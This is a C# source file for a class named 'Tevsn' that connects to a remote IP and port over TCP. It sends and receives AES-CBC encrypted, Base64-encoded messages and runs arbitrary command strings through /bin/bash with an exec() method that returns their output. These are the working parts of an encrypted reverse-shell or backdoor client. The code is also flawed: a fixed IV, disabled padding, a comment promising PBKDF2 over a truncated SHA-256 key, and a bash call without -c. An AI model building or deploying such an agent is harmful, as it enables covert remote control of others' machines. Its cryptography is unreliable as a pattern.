using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;

namespace tevsn
{
    public class Tevsn
    {
        public String IP { get;set; }
        public String Pass { get;set; } = "";
        public String Salt { get;set; } = "";
        public IPEndPoint ServerAddress {get;set;}
        public int Port { get;set; }
        public byte[] Key { get;set; }
        public byte[] IV { get;set; }
        private BinaryReader? reader;
        private BinaryWriter? writer;
        public TcpClient tcpClient = new TcpClient();
        
        public Tevsn(string ip, int port, byte[] key, byte[] iv, string pass, string salt)
        {
            this.IP = ip;
            this.Port = port;
            this.Key = key;
            this.IV = iv;
            this.ServerAddress = new IPEndPoint(IPAddress.Parse(ip), port);
            this.Pass = pass;
            this.Salt = salt;
        }

        //try to connect, if success, return true
        public bool Connect()
        {
            try
            {
                tcpClient.Connect(IP, Port);
                return true;
            }
            catch (Exception e)
            {   
                e.ToString();
                return false;
            }
        }

        //check if connection is alive
        public bool IsConnected()
        {
            try
            {
                if (tcpClient.Client.Poll(0, SelectMode.SelectRead))
                {
                    byte[] buff = new byte[1];
                    if (tcpClient.Client.Receive(buff, SocketFlags.Peek) == 0)
                    {
                        return false;
                    }
                }
                return true;
            }
            catch (Exception e)
            {
                e.ToString();
                return false;
            }
        }

        public void Send(String data)
        {
            Console.Write("Trying to send: "+data +"\n");
            NetworkStream clientStream = tcpClient.GetStream();
            writer = new BinaryWriter(clientStream);
            string toSend = Encrypt(data);
            Console.Write(data + ", encrypted as: " + toSend + "\n");
            byte[] toSendBytes = Encoding.UTF8.GetBytes(toSend);
            byte[] lenBytes = BitConverter.GetBytes(toSendBytes.Length);
            Array.Reverse(lenBytes);
            writer.Write(lenBytes);
            writer.Write(toSendBytes);
            writer.Flush();
        }

        public String Receive()
        {
            String message;
            NetworkStream clientStream = tcpClient.GetStream();
            reader = new BinaryReader(clientStream);
            byte[] lenBytes = reader.ReadBytes(4);
            Array.Reverse(lenBytes);
            int len = BitConverter.ToInt32(lenBytes);
            byte[] bytes = reader.ReadBytes(len);
            if(bytes.Length > 1)
            {
                Console.Write(bytes + "Received!\n");
                string str = Encoding.UTF8.GetString(bytes);
                Console.Write("String: " + str);
                string nicer = str.Replace("=","");
                byte[] b64 = Base64decode(str);
                message = Decrypt(b64);
                Console.Write("Decrypted: " + message.ToString());
                return message;
            }
            else 
            {
                return "--";
            }
        }

        public string exec(String command)
        {
            // Start the child process.
            Process p = new Process();
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = "/bin/bash";
            p.StartInfo.Arguments = command;
            p.Start();
            string output = p.StandardOutput.ReadToEnd();
            p.WaitForExit();
            return output;
        }

            //write decrypt method for aes cbc
            private string Decrypt(byte[] bytes)
            {
                //ReadKey(Key.ToString()!);
                using (Aes aes = Aes.Create())
                {
                    aes.Key = Key;
                    aes.IV = IV;
                    aes.Padding = PaddingMode.None;
                    aes.Mode = CipherMode.CBC;
                    using (ICryptoTransform decryptor = aes.CreateDecryptor())
                    {
                        byte[] decryptedBytes = decryptor.TransformFinalBlock(bytes, 0, bytes.Length);
                        Console.Write("Base64: " + Encoding.UTF8.GetString(decryptedBytes));
                        return Encoding.UTF8.GetString(Base64decode(Encoding.UTF8.GetString(decryptedBytes)));
                    }
                }
            }

            public String Encrypt(string message)
            {
                byte[] bytes = Encoding.UTF8.GetBytes(Base64encode(Encoding.UTF8.GetBytes(message)));
                byte[] IV = this.IV;
                Console.Write("Starting encryption...\n");

                using (Aes aesAlg = Aes.Create())
                {
                    aesAlg.Key = this.Key;

                    aesAlg.IV = IV;

                    aesAlg.Mode = CipherMode.CBC;

                    aesAlg.Padding = PaddingMode.None;

                    using (ICryptoTransform encryptor = aesAlg.CreateEncryptor())
                    {
                        byte[] encryptedBytes = encryptor.TransformFinalBlock(bytes, 0, bytes.Length);
                        Console.Write(Base64encode(encryptedBytes) + ", is encrypted stuff!\n");

                        return Base64encode(encryptedBytes);
                    }
                    
                }
                /*
                var combinedIvCt = new byte[IV.Length + encrypted.Length];
                Array.Copy(IV, 0, combinedIvCt, 0, IV.Length);
                Array.Copy(encrypted, 0, combinedIvCt, IV.Length, encrypted.Length);
                */

            }

            //create method to derive pbkdf2 with hmacsha256
            public void ReadKey(string key)
            {
                byte[] keyBytes = Encoding.UTF8.GetBytes(key);
                SHA256 sha256 = SHA256.Create();
                byte[] hash = sha256.ComputeHash(keyBytes);
                byte[] keyBytes2 = new byte[16];
                for(int i = 0; i < 16; i++)
                {
                    keyBytes2[i] = hash[i];
                }
                Key = keyBytes2;
            }

            //create method to read iv 

            public string Base64encode(byte[] arg)
            {
                string s = Convert.ToBase64String(arg); // Regular base64 encoder
                s = s.Split('=')[0]; // Remove any trailing '='s
                //s = s.Replace('+', '-'); // 62nd char of encoding
                //s = s.Replace('/', '_'); // 63rd char of encoding
                return s;
            }

            static byte[] Base64decode(string arg)
            {
                string s = arg;
                //s = s.Replace('-', '+'); // 62nd char of encoding
                //s = s.Replace('_', '/'); // 63rd char of encoding
                switch (s.Length % 4) // Pad with trailing '='s
                {
                    case 0: break; // No pad chars in this case
                    case 2: s += "=="; break; // Two pad chars
                    case 3: s += "="; break; // One pad char
                    default: throw new System.Exception(
                    "Illegal base64url string!");
                }
                return Convert.FromBase64String(s); // Standard base64 decoder
            }

    }
}
